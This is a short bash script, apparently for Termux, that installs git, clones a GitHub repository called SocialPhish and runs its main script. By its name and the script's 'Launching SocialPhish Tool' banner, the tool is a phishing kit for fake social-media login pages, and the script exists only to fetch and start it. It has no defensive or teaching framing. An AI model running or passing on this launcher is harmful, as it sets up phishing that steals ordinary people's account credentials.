#!/bin/bash
echo "[*] Launching SocialPhish Tool..."
pkg install git -y
git clone https://github.com/xHak9x/SocialPhish.git
cd SocialPhish
bash socialphish.sh
